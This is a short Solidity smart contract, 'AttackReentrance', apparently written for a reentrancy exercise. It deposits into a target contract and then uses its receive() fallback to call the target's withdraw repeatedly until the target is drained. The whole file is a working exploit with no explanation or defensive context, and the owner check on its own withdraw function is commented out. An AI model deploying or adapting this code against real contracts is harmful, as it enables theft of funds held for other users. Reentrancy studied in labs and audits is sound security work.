pragma solidity ^0.8.0;

contract AttackReentrance {
    uint256 amount;
    address payable victim;
    address owner;
    constructor(uint256 _amount, address payable _victim) public {
        amount = _amount;
        victim = _victim;
        owner = msg.sender;
    }

    function donate() public payable {
        require(msg.value == amount, "Please call donate with 0.001 ETH.");
        bytes memory payload = abi.encodeWithSignature("donate(address)", address(this));
        (bool success, ) = victim.call{value: amount}(payload);
        require(success, "Transaction call using encodeWithSignature is not successful");
    }

    function withdraw() public {
//        require(msg.sender == owner, "This action allowed only for owner.");
        payable(owner).transfer(address(this).balance);
    }

    function maliciousWithdraw(uint256 _amount) public {
        bytes memory payload = abi.encodeWithSignature("withdraw(uint256)", _amount);
        (bool success, ) = victim.call(payload);
        require(success, "Transaction call using encodeWithSignature is not successful 222");
    }

    receive() external payable {


        uint256 balance = victim.balance;
        if (balance >= amount) {
            maliciousWithdraw(amount);
        }
    }
}
